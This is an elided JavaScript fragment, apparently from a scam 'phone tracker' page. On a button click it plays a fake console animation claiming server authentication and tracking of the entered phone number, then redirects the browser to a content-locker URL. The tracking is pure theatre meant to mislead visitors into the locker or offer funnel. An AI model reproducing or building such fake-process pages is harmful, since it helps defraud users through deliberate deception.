...
// console
    ...
    $("#start").click(function(){
           ...
           text:" <span class='text-primary'>Performing server authentication:</span> connect_to_live-phonic-tracker_server(332FS2) <br>"
           ...
           + "<span class='text-feild'>PHONE NUMBER No:</span> "+divValue+" <br>"
           ...
           + "<span class='text-primary'>Initiating redirect procedure.</span> <br>"
            ...
            "fps"        : 60,
            callback: function () {
              window.location.href = "https://www.locked2.com/cl.php?id=1527be720f39578d26b28941496dbb75";
            }
      });
